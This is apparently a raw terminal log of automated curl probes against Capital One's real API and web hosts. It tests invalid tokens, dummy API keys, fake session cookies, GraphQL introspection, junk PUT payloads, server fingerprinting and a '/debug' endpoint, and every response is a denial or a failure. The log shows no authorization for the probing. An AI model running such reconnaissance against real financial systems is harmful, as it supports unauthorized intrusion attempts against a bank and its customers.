

# Authentication Testing
# Sun Jun 22 10:17:27 PM EEST 2025

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Authorization: Bearer invalid_token' 'https://api.capitalone.com/v3/users/me'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   721    0   721    0     0    996      0 --:--:-- --:--:-- --:--:--   995
 <div style="border: 3px solid #4991C5; font:1.5em; font-family:tahoma,calibri,arial; font-weight:bold; color:#1A4369; padding:5px; margin:10px; text-align:center">  The specified URL cannot be found. </div><!--0123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234-->

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'X-API-KEY: 12345' 'https://api.capitalone.com/v3/users/me'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   109    0   109    0     0    149      0 --:--:-- --:--:-- --:--:--   149
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Authorization: Bearer invalid_token' 'https://onlinebanking.capitalone.com/api/session'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'X-API-KEY: 12345' 'https://onlinebanking.capitalone.com/api/session'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Authorization: Bearer invalid_token' 'https://apply.capitalone.com/api/application/status'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1053  100  1053    0     0  14197      0 --:--:-- --:--:-- --:--:-- 14040
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
<TITLE>ERROR: The request could not be satisfied</TITLE>
</HEAD><BODY>
<H1>403 ERROR</H1>
<H2>The request could not be satisfied.</H2>
<HR noshade size="1px">
This distribution is not configured to allow the HTTP request method that was used for this request. The distribution supports only cachable requests.
We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again later, or contact the app or website owner.
<BR clear="all">
If you provide content to customers through CloudFront, you can find steps to troubleshoot and help prevent this error by reviewing the CloudFront documentation.
<BR clear="all">
<HR noshade size="1px">
<PRE>
Generated by cloudfront (CloudFront)
Request ID: JhI8VMp1MDPzB23ZDhfUHJrfiStTasuo0iAhIABum1TtJYYWpXvQ-w==
</PRE>
<ADDRESS>
</ADDRESS>
</BODY></HTML>
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'X-API-KEY: 12345' 'https://apply.capitalone.com/api/application/status'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0   111    0     0    124      0 --:--:-- --:--:-- --:--:--   124
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Authorization: Bearer invalid_token' 'https://support.capitalone.com/api/v1/tickets'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'X-API-KEY: 12345' 'https://support.capitalone.com/api/v1/tickets'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Authorization: Bearer invalid_token' 'https://mobile.capitalone.com/api/config'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    135      0 --:--:-- --:--:-- --:--:--   135
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'X-API-KEY: 12345' 'https://mobile.capitalone.com/api/config'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    76    0    76    0     0    156      0 --:--:-- --:--:-- --:--:--   156100    76    0    76    0     0    156      0 --:--:-- --:--:-- --:--:--   156
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Authorization: Bearer invalid_token' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'X-API-KEY: 12345' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com


# Session Management Testing
# Sun Jun 22 10:17:31 PM EEST 2025

$ curl -v --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -b 'SESSIONID=INVALID_SESSION' -c cookies.txt 'https://api.capitalone.com/v3/users/me'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host api.capitalone.com:443 was resolved.
* IPv6: (none)
* IPv4: 34.206.133.222, 34.194.139.25, 34.202.246.154
*   Trying 34.206.133.222:443...
* Connected to api.capitalone.com (34.206.133.222) port 443
* ALPN: curl offers h2,http/1.1
} [5 bytes data]
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
} [512 bytes data]
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Server hello (2):
{ [95 bytes data]
* TLSv1.2 (IN), TLS handshake, Certificate (11):
{ [4625 bytes data]
* TLSv1.2 (IN), TLS handshake, Server key exchange (12):
{ [333 bytes data]
* TLSv1.2 (IN), TLS handshake, Server finished (14):
{ [4 bytes data]
* TLSv1.2 (OUT), TLS handshake, Client key exchange (16):
} [70 bytes data]
* TLSv1.2 (OUT), TLS change cipher, Change cipher spec (1):
} [1 bytes data]
* TLSv1.2 (OUT), TLS handshake, Finished (20):
} [16 bytes data]
* TLSv1.2 (IN), TLS handshake, Finished (20):
{ [16 bytes data]
* SSL connection using TLSv1.2 / ECDHE-RSA-AES128-GCM-SHA256 / prime256v1 / rsaEncryption
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: jurisdictionC=US; jurisdictionST=Delaware; businessCategory=Private Organization; serialNumber=2419959; C=US; ST=Virginia; L=McLean; O=Capital One Financial Corporation; CN=api.capitalone.com
*  start date: Jul 31 00:00:00 2024 GMT
*  expire date: Jul 31 23:59:59 2025 GMT
*  subjectAltName: host "api.capitalone.com" matched cert's "api.capitalone.com"
*  issuer: C=US; O=DigiCert Inc; CN=DigiCert EV RSA CA G2
*  SSL certificate verify ok.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* using HTTP/1.x
} [5 bytes data]
> GET /v3/users/me HTTP/1.1
> Host: api.capitalone.com
> User-Agent: AdvancedResearchBot/2.0
> Accept: */*
> Cookie: SESSIONID=INVALID_SESSION
> 
{ [5 bytes data]
< HTTP/1.1 403 Forbidden
< Date: Sun, 22 Jun 2025 19:17:32 GMT
< Content-Type: application/json
< Transfer-Encoding: chunked
< Connection: keep-alive
< 
{ [109 bytes data]
100   109    0   109    0     0    149      0 --:--:-- --:--:-- --:--:--   149100   109    0   109    0     0    149      0 --:--:-- --:--:-- --:--:--   149
* Connection #0 to host api.capitalone.com left intact
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me' | grep -i 'set-cookie'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

$ curl -v --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -b 'SESSIONID=INVALID_SESSION' -c cookies.txt 'https://onlinebanking.capitalone.com/api/session'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: onlinebanking.capitalone.com
* Closing connection
curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://onlinebanking.capitalone.com/api/session' | grep -i 'set-cookie'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -v --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -b 'SESSIONID=INVALID_SESSION' -c cookies.txt 'https://apply.capitalone.com/api/application/status'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host apply.capitalone.com:443 was resolved.
* IPv6: (none)
* IPv4: 18.165.171.26, 18.165.171.100, 18.165.171.59, 18.165.171.109
*   Trying 18.165.171.26:443...
* Connected to apply.capitalone.com (18.165.171.26) port 443
* ALPN: curl offers h2,http/1.1
} [5 bytes data]
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
} [512 bytes data]
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Server hello (2):
{ [122 bytes data]
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
{ [10 bytes data]
* TLSv1.3 (IN), TLS handshake, Certificate (11):
{ [4197 bytes data]
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
{ [264 bytes data]
* TLSv1.3 (IN), TLS handshake, Finished (20):
{ [36 bytes data]
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
} [1 bytes data]
* TLSv1.3 (OUT), TLS handshake, Finished (20):
} [36 bytes data]
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
* ALPN: server did not agree on a protocol. Uses default.
* Server certificate:
*  subject: jurisdictionC=US; jurisdictionST=Delaware; businessCategory=Private Organization; serialNumber=2419959; C=US; ST=Virginia; L=McLean; postalCode=22102; street=1680 Capital One Dr; O=Capital One Financial Corporation; CN=apply.capitalone.com
*  start date: Mar 18 00:00:00 2025 GMT
*  expire date: Mar 18 23:59:59 2026 GMT
*  subjectAltName: host "apply.capitalone.com" matched cert's "apply.capitalone.com"
*  issuer: C=US; O=DigiCert Inc; CN=DigiCert EV RSA CA G2
*  SSL certificate verify ok.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
* using HTTP/1.x
} [5 bytes data]
> GET /api/application/status HTTP/1.1
> Host: apply.capitalone.com
> User-Agent: AdvancedResearchBot/2.0
> Accept: */*
> Cookie: SESSIONID=INVALID_SESSION
> 
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
{ [157 bytes data]
  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0< HTTP/1.1 403 Forbidden
< Content-Type: application/xml
< Transfer-Encoding: chunked
< Connection: keep-alive
< Server: AmazonS3
< Date: Sun, 22 Jun 2025 19:17:33 GMT
< X-Cache: Error from cloudfront
< Via: 1.1 95d91f475ed49fe866e3efa7108a6f62.cloudfront.net (CloudFront)
< X-Amz-Cf-Pop: OTP50-P1
< X-Amz-Cf-Id: hQeGV1vX4dh8iBQyI1X07gJd5CuL6S7iE0XtSvi-R79gyb7qjD4BgQ==
< X-XSS-Protection: 1; mode=block
< X-Frame-Options: SAMEORIGIN
< Referrer-Policy: strict-origin-when-cross-origin
< X-Content-Type-Options: nosniff
< Strict-Transport-Security: max-age=31536000
< 
{ [111 bytes data]
100   111    0   111    0     0     90      0 --:--:--  0:00:01 --:--:--    90
* Connection #0 to host apply.capitalone.com left intact
<?xml version="1.0" encoding="UTF-8"?>
<Error><Code>AccessDenied</Code><Message>Access Denied</Message></Error>
$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://apply.capitalone.com/api/application/status' | grep -i 'set-cookie'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:--  0:00:01 --:--:--     0

$ curl -v --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -b 'SESSIONID=INVALID_SESSION' -c cookies.txt 'https://support.capitalone.com/api/v1/tickets'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: support.capitalone.com
* Closing connection
curl: (6) Could not resolve host: support.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://support.capitalone.com/api/v1/tickets' | grep -i 'set-cookie'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl -v --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -b 'SESSIONID=INVALID_SESSION' -c cookies.txt 'https://mobile.capitalone.com/api/config'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Host mobile.capitalone.com:443 was resolved.
* IPv6: (none)
* IPv4: 18.165.171.100, 18.165.171.77, 18.165.171.66, 18.165.171.96
*   Trying 18.165.171.100:443...
* Connected to mobile.capitalone.com (18.165.171.100) port 443
* ALPN: curl offers h2,http/1.1
} [5 bytes data]
* TLSv1.3 (OUT), TLS handshake, Client hello (1):
} [512 bytes data]
*  CAfile: /etc/ssl/certs/ca-certificates.crt
*  CApath: /etc/ssl/certs
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Server hello (2):
{ [122 bytes data]
* TLSv1.3 (IN), TLS handshake, Encrypted Extensions (8):
{ [19 bytes data]
* TLSv1.3 (IN), TLS handshake, Certificate (11):
{ [3230 bytes data]
* TLSv1.3 (IN), TLS handshake, CERT verify (15):
{ [264 bytes data]
* TLSv1.3 (IN), TLS handshake, Finished (20):
{ [36 bytes data]
* TLSv1.3 (OUT), TLS change cipher, Change cipher spec (1):
} [1 bytes data]
* TLSv1.3 (OUT), TLS handshake, Finished (20):
} [36 bytes data]
* SSL connection using TLSv1.3 / TLS_AES_128_GCM_SHA256 / X25519 / RSASSA-PSS
* ALPN: server accepted h2
* Server certificate:
*  subject: jurisdictionC=US; jurisdictionST=Delaware; businessCategory=Private Organization; serialNumber=2419959; C=US; ST=Virginia; L=McLean; postalCode=22102; street=1680 Capital One Dr; O=Capital One Financial Corporation; CN=m.capitalone.com
*  start date: Mar 18 00:00:00 2025 GMT
*  expire date: Mar 19 23:59:59 2026 GMT
*  subjectAltName: host "mobile.capitalone.com" matched cert's "mobile.capitalone.com"
*  issuer: C=US; O=DigiCert Inc; CN=DigiCert EV RSA CA G2
*  SSL certificate verify ok.
*   Certificate level 0: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 1: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
*   Certificate level 2: Public key type RSA (2048/112 Bits/secBits), signed using sha256WithRSAEncryption
} [5 bytes data]
* using HTTP/2
* [HTTP/2] [1] OPENED stream for https://mobile.capitalone.com/api/config
* [HTTP/2] [1] [:method: GET]
* [HTTP/2] [1] [:scheme: https]
* [HTTP/2] [1] [:authority: mobile.capitalone.com]
* [HTTP/2] [1] [:path: /api/config]
* [HTTP/2] [1] [user-agent: AdvancedResearchBot/2.0]
* [HTTP/2] [1] [accept: */*]
* [HTTP/2] [1] [cookie: SESSIONID=INVALID_SESSION]
} [5 bytes data]
> GET /api/config HTTP/2
> Host: mobile.capitalone.com
> User-Agent: AdvancedResearchBot/2.0
> Accept: */*
> Cookie: SESSIONID=INVALID_SESSION
> 
{ [5 bytes data]
* TLSv1.3 (IN), TLS handshake, Newsession Ticket (4):
{ [157 bytes data]
< HTTP/2 404 
< content-type: application/json
< date: Sun, 22 Jun 2025 19:17:35 GMT
< x-janus-response-latency: 1
< x-cache: Error from cloudfront
< via: 1.1 e813d0fba8058b8b4ecdbcd875bd4322.cloudfront.net (CloudFront)
< x-amz-cf-pop: OTP50-P1
< alt-svc: h3=":443"; ma=86400
< x-amz-cf-id: _wYsowZOh_LxNb5gMHjRo3s5v6oqxQ-44zcwh7Se_8ye53a6u-TEag==
< x-xss-protection: 1; mode=block
< x-frame-options: SAMEORIGIN
< referrer-policy: strict-origin-when-cross-origin
< x-content-type-options: nosniff
< strict-transport-security: max-age=31622400; includeSubDomains
< 
{ [76 bytes data]
100    76    0    76    0     0    224      0 --:--:-- --:--:-- --:--:--   224
* Connection #0 to host mobile.capitalone.com left intact
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://mobile.capitalone.com/api/config' | grep -i 'set-cookie'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0    76    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

$ curl -v --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -b 'SESSIONID=INVALID_SESSION' -c cookies.txt 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Could not resolve host: identity.capitalone.com
* Closing connection
curl: (6) Could not resolve host: identity.capitalone.com

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth' | grep -i 'set-cookie'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com


# API Behavior Testing
# Sun Jun 22 10:17:35 PM EEST 2025

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' 'https://api.capitalone.com/v3/users/me'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   144    0   109  100    35    133     42 --:--:-- --:--:-- --:--:--   175
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl -X PUT --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -d '{"invalid":"payload"}' 'https://api.capitalone.com/v3/users/me'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   130    0   109  100    21    135     26 --:--:-- --:--:-- --:--:--   160
{"code":101305,"description":"Access forbidden. No CN/Api-Key available|No matching endpoint anonymous app"}

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' 'https://onlinebanking.capitalone.com/api/session'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -X PUT --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -d '{"invalid":"payload"}' 'https://onlinebanking.capitalone.com/api/session'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: onlinebanking.capitalone.com

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' 'https://apply.capitalone.com/api/application/status'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1088  100  1053  100    35  13773    457 --:--:-- --:--:-- --:--:-- 14315
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
<TITLE>ERROR: The request could not be satisfied</TITLE>
</HEAD><BODY>
<H1>403 ERROR</H1>
<H2>The request could not be satisfied.</H2>
<HR noshade size="1px">
This distribution is not configured to allow the HTTP request method that was used for this request. The distribution supports only cachable requests.
We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again later, or contact the app or website owner.
<BR clear="all">
If you provide content to customers through CloudFront, you can find steps to troubleshoot and help prevent this error by reviewing the CloudFront documentation.
<BR clear="all">
<HR noshade size="1px">
<PRE>
Generated by cloudfront (CloudFront)
Request ID: lcGJK3mTSaP4SG7c-9f_dLDteAklWVIjnzffnOOMFGxgSaKKyvnvGQ==
</PRE>
<ADDRESS>
</ADDRESS>
</BODY></HTML>
$ curl -X PUT --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -d '{"invalid":"payload"}' 'https://apply.capitalone.com/api/application/status'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100  1074  100  1053  100    21  15861    316 --:--:-- --:--:-- --:--:-- 16272
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<HTML><HEAD><META HTTP-EQUIV="Content-Type" CONTENT="text/html; charset=iso-8859-1">
<TITLE>ERROR: The request could not be satisfied</TITLE>
</HEAD><BODY>
<H1>403 ERROR</H1>
<H2>The request could not be satisfied.</H2>
<HR noshade size="1px">
This distribution is not configured to allow the HTTP request method that was used for this request. The distribution supports only cachable requests.
We can't connect to the server for this app or website at this time. There might be too much traffic or a configuration error. Try again later, or contact the app or website owner.
<BR clear="all">
If you provide content to customers through CloudFront, you can find steps to troubleshoot and help prevent this error by reviewing the CloudFront documentation.
<BR clear="all">
<HR noshade size="1px">
<PRE>
Generated by cloudfront (CloudFront)
Request ID: A2sjs_LYWzYB43U_Rw8DFJmbWOz-z83Zvkjt2w_9KwtFvi30kKHlYQ==
</PRE>
<ADDRESS>
</ADDRESS>
</BODY></HTML>
$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' 'https://support.capitalone.com/api/v1/tickets'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl -X PUT --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -d '{"invalid":"payload"}' 'https://support.capitalone.com/api/v1/tickets'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: support.capitalone.com

$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' 'https://mobile.capitalone.com/api/config'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100   111    0    76  100    35    178     82 --:--:-- --:--:-- --:--:--   259100   111    0    76  100    35    178     81 --:--:-- --:--:-- --:--:--   259
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl -X PUT --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -d '{"invalid":"payload"}' 'https://mobile.capitalone.com/api/config'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0100    97    0    76  100    21    152     42 --:--:-- --:--:-- --:--:--   194
{"id": "404", "text": "Invalid Request", "developerText": "Invalid Request"}
$ curl -X POST --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}}"}' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com

$ curl -X PUT --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -d '{"invalid":"payload"}' 'https://identity.capitalone.com/auth/realms/capitalone/protocol/openid-connect/auth'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0curl: (6) Could not resolve host: identity.capitalone.com


# Server Information Testing
# Sun Jun 22 10:17:38 PM EEST 2025

$ curl -I --connect-timeout 15 -A 'AdvancedResearchBot/2.0' -H 'Accept: */*' 'https://api.capitalone.com/v3/users/me' | grep -iE 'server|x-powered-by'
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0

$ curl --connect-timeout 15 -A 'AdvancedResearchBot/2.0' 'https://api.capitalone.com/v3/users/me/debug'
